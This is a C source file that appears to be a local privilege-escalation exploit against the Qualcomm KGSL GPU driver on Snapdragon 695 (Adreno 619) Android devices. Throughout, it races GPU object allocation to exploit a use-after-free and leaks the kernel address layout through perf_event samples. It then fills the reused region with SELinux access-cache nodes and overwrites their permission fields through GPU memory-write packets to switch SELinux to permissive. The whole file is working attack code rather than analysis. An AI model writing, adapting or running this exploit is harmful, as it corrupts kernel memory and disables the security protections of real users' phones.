

#include "avc_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1;
static uint64_t uaf_gpuaddr = 0;

static void die(const char *msg) { perror(msg); exit(1); }

/* ==================== PM4 helpers ==================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ==================== KGSL wrappers (without CPU map) ==================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ==================== Command runner ==================== */
static int run_cmd(uint32_t *cmd, int dwords,
                   uint64_t ib_ga, void *ib_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

/* ==================== KASLR detection (for reference only) ==================== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ==================== CP_MEM_WRITE helper ==================== */
static void gpu_write_kernel(uint64_t va, uint64_t val,
                             uint64_t ib_ga, void *ib_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(va, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) {
        fprintf(stderr, "gpu_write_kernel failed for va=0x%lx\n", va);
    }
}

/* ==================== setenforce 0 check ==================== */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ==================== Trigger AVC allocations ==================== */
static void trigger_avc_allocations(void) {
    printf("[*] Triggering AVC allocations...\n");
    // Access many files to cause SELinux checks and allocate avc_nodes
    const char *paths[] = {
        "/sys/fs/selinux/enforce",
        "/proc/self/attr/current",
        "/dev/null",
        "/system/bin/sh",
        "/proc/version",
        "/sys/kernel/notes",
        "/proc/meminfo",
        "/dev/urandom",
        "/system/etc/hosts",
        "/vendor/etc/hosts",
        "/apex/com.android.runtime/bin/linker64",
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/system/packages.xml",
        "/proc/self/fd",
        "/proc/self/maps",
        "/sys/class/kgsl/kgsl-3d0/",
        "/dev/kgsl-3d0",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        int fd = open(paths[i], O_RDONLY);
        if (fd >= 0) close(fd);
        usleep(100);
    }
    // Also try to do some operations that cause AVC denials
    for (int i = 0; i < 100; i++) {
        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
        if (fd >= 0) {
            write(fd, "1", 1);
            close(fd);
        }
        usleep(50);
    }
    printf("[*] AVC triggers done.\n");
}

/* ==================== Replace original scanning/flipping with blind write ==================== */
static void blind_write_avc_nodes(uint64_t base_gpuaddr, uint64_t ib_ga, void *ib_m,
                                  unsigned int ctx_id, unsigned int ib_id) {
    printf("[*] Blindly writing allowed=0xFFFFFFFF to potential avc_nodes\n");
    int writes = 0;
    // Overlapped page and ±5 neighboring pages (within UAF_SIZE)
    for (int page_off = -5; page_off <= 5; page_off++) {
        uint64_t page_va = base_gpuaddr + page_off * 0x1000;
        if (page_va < uaf_gpuaddr || page_va >= uaf_gpuaddr + UAF_SIZE) continue;
        // For each page, try every possible avc_node stride (72) within the page
        for (uint64_t off = 0; off < 0x1000 - AVC_NODE_STRIDE; off += AVC_NODE_STRIDE) {
            uint64_t node_allowed = page_va + off + 0xc; // allowed field offset
            gpu_write_kernel(node_allowed, 0xFFFFFFFF, ib_ga, ib_m, ctx_id, ib_id);
            writes++;
        }
    }
    printf("[*] Total AVC nodes written: %d\n", writes);
}

/* ==================== Race thread (without IMPORT) ==================== */
static void *race_thread(void *arg) {
    while (!race_done) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

static int phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    // We don't need mmap; we just need to reuse the GPU address.
    // The race thread is continuously alloc/free small objects.
    // We wait a bit and then allocate a small object and check if its GPU address
    // matches the freed large object's GPU address.
    // But we can simply do a loop to allocate and check.
    for (int i = 0; i < 100; i++) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id < 0) { usleep(1000); continue; }
        uint64_t ga = 0;
        gpuobj_info(id, &ga);
        if (ga == uaf_gpuaddr) {
            hit = 1;
            // Keep this object as the overlapped one
            // We'll store its ID for later use
            // For simplicity, we just note success and free it; we'll allocate a new one after.
            gpuobj_free(id);
            break;
        }
        gpuobj_free(id);
        usleep(1000);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) {
        printf("[-] Race failed to reuse GPU address\n");
        return 0;
    }
    printf("[+] Race won: GPU address reused!\n");
    return 1;
}

/* ==================== Main ==================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - UAF + blind AVC overwrite\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // KASLR detection (for info, not used further)
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    // We don't need init_cred for this method.

    // Use non-CPU-mapped objects for UAF
    alloc_flags = KGSL_CACHEMODE_WRITEBACK;  // no CPU map

    /* Phase 1: Allocate large object (UAF_SIZE) */
    printf("[*] Phase 1: Allocating large GPU object (UAF_SIZE=0x%lx)\n", UAF_SIZE);
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    if (uaf_gpuaddr == 0) {
        printf("[-] Large object gpuaddr=0 (should not happen with non-CPU-mapped)\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] Large object id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);

    /* Phase 2: Free large object */
    printf("[*] Phase 2: Free large object\n");
    gpuobj_free(uaf_id);
    printf("[+] Freed\n");

    /* Phase 3: Reclaim memory */
    printf("[*] Phase 3: Reclaim memory\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    /* Phase 4: Race to reuse the GPU address */
    printf("[*] Phase 4: Race to reuse GPU address\n");
    if (!phase2_race()) {
        close(kgsl_fd);
        return 1;
    }

    /* Phase 5: Allocate the final overlapping object (the one that will contain AVC nodes) */
    printf("[*] Phase 5: Allocating final overlapped object\n");
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    if (ov_id < 0) die("overlap alloc");
    uint64_t ov_gpuaddr = 0;
    gpuobj_info(ov_id, &ov_gpuaddr);
    printf("[+] Overlapped object id=%d gpuaddr=0x%lx\n", ov_id, ov_gpuaddr);
    if (ov_gpuaddr != uaf_gpuaddr) {
        printf("[-] GPU address not reused (got 0x%lx, expected 0x%lx)\n", ov_gpuaddr, uaf_gpuaddr);
        gpuobj_free(ov_id);
        close(kgsl_fd);
        return 1;
    }

    /* Phase 6: Trigger AVC allocations to fill the UAF region */
    trigger_avc_allocations();

    /* Phase 7: Prepare GPU context and IB for writing */
    printf("[*] Phase 7: Prepare GPU context and IB\n");
    unsigned int ctx_id = create_context();
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    printf("[GPU] ctx=%u ib_ga=0x%lx\n", ctx_id, ib_ga);

    /* Phase 8: Blindly overwrite AVC nodes in the overlapped region */
    blind_write_avc_nodes(ov_gpuaddr, ib_ga, ib_m, ctx_id, ib_id);

    /* Phase 9: Try setenforce 0 */
    printf("[*] Phase 9: Trying setenforce 0\n");
    int ok = try_setenforce0();
    if (!ok) {
        printf("[!] First attempt failed, retrying after delay...\n");
        sleep(1);
        ok = try_setenforce0();
    }

    if (ok) {
        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
    } else {
        printf("[-] SELinux still enforcing. AVC nodes may not have been overwritten.\n");
    }

    /* Final status */
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    gpuobj_free(ov_id);
    gpuobj_free(ib_id);
    close(kgsl_fd);
    return ok ? 0 : 1;
}
